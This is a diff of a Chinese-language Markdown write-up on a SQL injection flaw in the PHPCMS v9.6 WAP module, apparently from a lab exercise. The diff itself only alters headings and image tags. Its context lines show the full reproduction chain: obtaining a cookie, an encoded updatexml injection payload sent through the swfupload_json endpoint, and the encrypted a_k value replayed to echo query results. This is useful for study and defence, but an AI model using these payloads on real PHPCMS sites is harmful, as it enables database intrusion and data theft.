@@ -1,6 +1,6 @@
-#<center>PHPCMS_V9.6 WAP模块SQL注入漏洞分析文档</center>#
+# PHPCMS_V9.6 WAP模块SQL注入漏洞分析 #
 
-<center>![Heartbleed](文档/1.jpg)</center>
+![phpcms](文档/1.jpg)
 
 ## 1.&emsp;漏洞描述 ##
 
@@ -59,13 +59,13 @@
 ### 2.3&emsp;漏洞验证 ###
 
 1. 访问`http://192.168.119.131/phpcms/install_package/index.php?m=wap&c=index&a=init&siteid=1`获取cookie。
-<center>![Heartbleed](文档/2.png)</center>
+![phpcms](文档/2.png)
 
 2. 把这个cookie的值复制下来以POST传入userid_flash变量访问`/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28select%20flag%20from%20flag%3B%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26`，该URL通过url解码后是`/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=&id=%*27 and updatexml(1,concat(1,(select flag from flag;)),1)#&m=1&f=haha&modelid=2&catid=7&`其中`select flag from flag;`可以换成任一SQL注入语句。通过该cookie获取att_json。
-<center>![Heartbleed](文档/3.png)</center>
+![phpcms](文档/3.png)
 
 3. 上一步我们已经获取到了通过json在通过cookie加密的SQL了因为他返回的cookie就是已经加密的SQLPayload现在我们传入到a_k变量，访问`http://192.168.119.131/phpcms/install_package/index.php?m=content&c=down&a_k=8532s3x_Spdkw0xiFxEcKyivtW4Sh8zyDV07Yyl2MOds0nULY-wjT9y3RLa4P-Fj7FBzUkhIct0DRpcIE1bwI6pklJAazBejhJIqRJF3hxaYB6S2e_ogokZOsiXYHulCW6-_yhFYziGpsy9H0dW93f7ZeU5VYf-Y-OILu22tlk3pUThLDLUnXyUVvZh8pc9YXmjGHMz4NeE`查看返回结果：
-<center>![Heartbleed](文档/4.png)</center>
+![phpcms](文档/4.png)
 可以看到SQL语句执行成功并将结果返回在页面中。
 
 4. SQL语句回显出结果，证明漏洞验证成功。
